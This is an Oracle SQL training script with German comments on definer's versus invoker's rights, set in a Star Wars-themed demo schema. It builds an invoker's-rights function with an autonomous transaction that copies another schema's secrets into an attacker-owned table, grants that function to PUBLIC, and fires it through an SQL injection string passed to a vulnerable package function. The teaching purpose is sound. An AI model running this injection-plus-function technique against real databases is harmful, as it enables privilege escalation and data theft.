-- Definers rights: Führe allen Code als die Rolle des Erstellers aus
-- Früher gab es bei den SYS-Packages einige Schwachstellen
-- Extra Vorsicht, wenn man dyn. SQL mit definers rights verwendet


-- Invoker's rights


-- Hey Admin, ich möchte gerne ein bisschen üben, kannst du mir bitte die Tutorial-Schemas von Oracle anlegen?
-- --> SCOTT/TIGER
-- As SCOTT:
create table secret_dump (
  secret varchar2(4000),
  created timestamp default current_timestamp
);

create or replace function bad_func
  return varchar2 authid current_user -- Invoker's rights!
  as
    pragma autonomous_transaction;
  begin
		execute immediate 'insert into scott.secret_dump (secret) select secret from imperial_secrets';
		commit;
		return 'Y';
  end;
/

grant execute on bad_func to public;
grant insert on secret_dump to public;


-- Exploit SQL Injection
--------------------------------------
-- Deathstar hat ROOM_INFO für PUBLIC freigegeben
-- grant execute on room_info to public;

-- Exploit direkt als SCOTT
truncate table secret_dump;
select * from secret_dump;

select deathstar.room_info.get_room_id(''') and scott.bad_func() = ''Y''--') from dual;


select * from secret_dump;

-- Selbst wenn ROOM_INFO nicht für Public freigegeben wäre,
-- oder ROOM_INFO als Invoker's rights definiert wäre
-- Könnten wir über die Schwachstelle in GET_ROOM_ID unsere bösartige Funktion aufrufen!